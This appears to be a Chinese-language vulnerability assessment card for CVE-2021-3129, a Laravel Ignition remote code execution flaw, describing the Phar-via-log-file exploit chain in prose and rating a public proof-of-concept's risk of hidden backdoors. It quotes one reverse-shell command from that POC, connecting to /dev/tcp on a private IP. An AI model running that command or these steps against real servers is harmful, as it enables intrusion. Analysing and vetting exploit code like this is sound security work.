## CVE-2021-3129 - Laravel (Ignition组件) RCE

**漏洞编号:** CVE-2021-3129

**漏洞类型:** RCE

**影响应用:** Laravel (Ignition组件)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Laravel < 8.4.2, Ignition < 2.5.2

**利用条件:** Laravel开启Debug模式且安装了Ignition组件(版本低于2.5.2)

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 45%

## 详情

POC有效性分析：该漏洞源于Laravel调试界面组件Ignition中的不安全逻辑。当应用处于Debug模式时，Ignition允许通过其接口执行某些修复操作。漏洞的核心在于利用`file_get_contents()`和`file_put_contents()`处理外部可控路径，导致通过`php://filter`协议配合Phar反序列化实现RCE。所分析的POC代码是一个高度自动化的利用脚本。它通过构造特殊的编码序列，在Laravel的日志文件中植入Phar有效载荷。随后，利用`view_file_handler`接口触发该日志文件的Phar解包，从而执行攻击者预定义的代码。该POC包含了针对多个Laravel/Monolog利用链（RCE1-RCE7）的支持，能够根据环境自动匹配。其有效性在于它规避了直接上传文件的限制，转而利用应用自身的日志记录机制作为缓冲区，配合复杂的字符编码转换（如Quoted-Printable到Base64）来绕过安全检测。利用步骤如下：1. 确认目标环境是否开启Debug模式；2. 清空现有日志文件以减少干扰；3. 发起多次请求，利用错误报错将Phar Payloads分段写入日志；4. 使用php://filter协议将日志内容转换为合法的Phar文件格式；5. 最终通过phar://伪协议触发反序列化。投毒风险分析：该POC存在中等程度的投毒风险。风险点主要体现在代码中硬编码的攻击指令。在提供的`Laravel/RCE5`利用链中，代码明确包含了一个反弹Shell指令：`system('bash -c "bash -i >& /dev/tcp/192.168.78.129/4444 0>&1"');`。虽然这是为了演示漏洞危害，但在实战中，如果不加甄别直接运行此类POC，可能会导致使用者的测试环境反向连接到未知的受控端（如代码编写者的IP地址）。此外，POC中大量使用了复杂的编码逻辑和通过系统命令调用`phpggc`生成Payload的操作。如果恶意攻击者在这些复杂的base64字符串或hex转换逻辑中植入针对渗透测试者本机的后门指令，普通研究员极难通过肉眼快速发现。这种‘黑吃黑’的风险在威胁情报领域屡见不鲜，因此在使用此POC前，必须在隔离的沙箱环境中运行，并仔细检查所有硬编码的IP地址和系统调用参数。

**项目地址:** [https://github.com/ambionics/laravel-exploits](https://github.com/ambionics/laravel-exploits)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129)
